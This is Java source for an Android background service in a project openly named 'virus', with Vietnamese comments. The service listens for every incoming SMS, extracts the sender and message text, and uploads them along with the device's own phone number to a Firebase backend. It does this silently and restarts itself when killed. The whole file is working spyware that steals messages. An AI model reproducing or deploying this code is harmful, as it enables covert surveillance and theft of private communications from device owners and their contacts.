package com.example.phanv.virus.Service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.example.phanv.virus.Control.FireBaseControl;
import com.example.phanv.virus.Control.ProcessData;
import com.example.phanv.virus.Model.MessageVirus;


public class MessageService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
        BroadcastReceiver broadcastSMSReceiver;
        IntentFilter iFMessage = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        broadcastSMSReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                processMessage(context, intent);
            }
        };
        registerReceiver(broadcastSMSReceiver, iFMessage);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    private void processMessage(Context context, Intent intent) {
        //pdus để lấy gói tin nhắn
        String sms_extra = "pdus";
        Bundle bundle = intent.getExtras();
        //bundle trả về tập các tin nhắn gửi về cùng lúc
        Object[] objArr = (Object[]) bundle.get(sms_extra);
        // biến lưu nội dung
        String smsContent = "";
        ProcessData getInfor = new ProcessData();
        String currentDate = getInfor.getCurrentTimeByFormat("dd-MM-yyyy");
        //duyệt vòng lặp để đọc từng tin nhắn
        for (int i = 0; i < objArr.length; i++) {
            //lệnh chuyển đổi về tin nhắn createFromPdu
            SmsMessage smsMsg = SmsMessage.
                    createFromPdu((byte[]) objArr[i]);
            //lấy nội dung tin nhắn
            String body = smsMsg.getMessageBody();
            //lấy số điện thoại tin nhắn
            String address = smsMsg.getDisplayOriginatingAddress();
            String currentTime = getInfor.getTimeByFormat("HH:mm:ss", smsMsg.getTimestampMillis());
            FireBaseControl fb = new FireBaseControl();
            MessageVirus ms = new MessageVirus(currentDate, "Receive", currentTime, address, body);
            fb.upMessage(getPhoneNumber(),ms);
        }
    }
    public String getPhoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
        }
        return  tMgr.getLine1Number();
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
